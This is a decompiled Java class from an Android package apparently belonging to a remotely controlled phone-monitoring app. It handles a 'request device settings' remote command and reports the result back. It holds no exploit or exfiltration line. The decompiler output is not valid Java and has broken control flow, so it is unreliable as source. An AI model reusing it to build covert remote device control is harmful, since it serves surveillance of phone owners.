package com.vvt.remotecommand.processor.misc;

import com.vvt.base.DeviceSettingId;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class h
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public h(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private String a(Object paramObject)
  {
    return null;
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    bool1 = a;
    if (bool1) {}
    Object localObject2 = ((ArrayList)localObject1).iterator();
    do
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject3 = DeviceSettingId.forValue((String)((Iterator)localObject2).next());
    } while (localObject3 != null);
    Object localObject3 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
    ((InvalidCommanFormatException)localObject3).<init>();
    throw ((Throwable)localObject3);
    int i = ((ArrayList)localObject1).size();
    if (i == 0)
    {
      int j = a;
      if (j != 0) {}
      localObject2 = DeviceSettingId.values();
      int m = localObject2.length;
      j = 0;
      localObject3 = null;
      while (j < m)
      {
        String str = localObject2[j].getUniqueId();
        ((ArrayList)localObject1).add(str);
        int k;
        j += 1;
      }
    }
    if (paramc != null)
    {
      bool2 = a;
      if (bool2) {}
      bool2 = false;
      localObject3 = null;
      paramc.a(paramRemoteCommand, this, null);
    }
    boolean bool2 = a;
    if (bool2) {}
    localObject3 = h();
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.REQUEST_DEVICE_SETTINGS;
    ((ControlCommand)localObject2).<init>(localRemoteFunction, localObject1);
    localObject1 = ((com.vvt.remotecontrol.a)localObject3).execute((ControlCommand)localObject2);
    if (paramc != null)
    {
      bool2 = a;
      if (bool2) {}
      localObject2 = a(localObject1);
      bool2 = localObject1 instanceof RmtCtrlOutputStatusMessage;
      if (bool2)
      {
        localObject3 = localObject1;
        localObject3 = (RmtCtrlOutputStatusMessage)localObject1;
        bool2 = ((RmtCtrlOutputStatusMessage)localObject3).isSuccess();
        if (!bool2) {
          break label277;
        }
        paramc.b(paramRemoteCommand, this, (String)localObject2);
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      label277:
      if (localObject2 == null)
      {
        localObject1 = (RmtCtrlOutputStatusMessage)localObject1;
        localObject3 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
        boolean bool3 = a;
        if ((!bool3) || (localObject3 == null))
        {
          localObject3 = new com/vvt/remotecommand/exception/RemoteCommandException;
          localObject1 = "Unknown.";
          ((RemoteCommandException)localObject3).<init>((String)localObject1);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject3);
        }
        else
        {
          localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject1).<init>((String)localObject3);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
        }
      }
      else
      {
        localObject3 = new com/vvt/remotecommand/exception/RemoteCommandException;
        ((RemoteCommandException)localObject3).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject3);
      }
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcRequestDeviceSettings";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 30000L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */